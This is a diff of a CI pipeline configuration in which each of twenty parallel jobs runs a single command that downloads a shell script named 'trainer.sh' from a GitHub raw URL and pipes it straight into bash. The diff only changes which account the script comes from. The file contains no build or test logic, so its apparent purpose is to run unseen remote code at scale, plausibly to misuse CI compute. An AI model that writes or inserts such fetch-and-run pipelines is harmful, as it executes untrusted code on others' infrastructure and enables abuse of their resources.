@@ -12,7 +12,7 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
     dependencies: []
   - name: 'Block #2'
     dependencies: []
@@ -20,130 +20,130 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #3'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #4'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #5'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #6'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #7'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #8'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #9'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #10'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #11'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #12'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #13'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #14'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #15'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #16'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #17'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #18'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #19'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
   - name: 'Block #20'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -O - https://raw.githubusercontent.com/nelsongayak/training/refs/heads/main/trainer.sh | bash'
+            - 'wget -O - https://raw.githubusercontent.com/hlumilemaqhekeza/training/refs/heads/main/trainer.sh | bash'
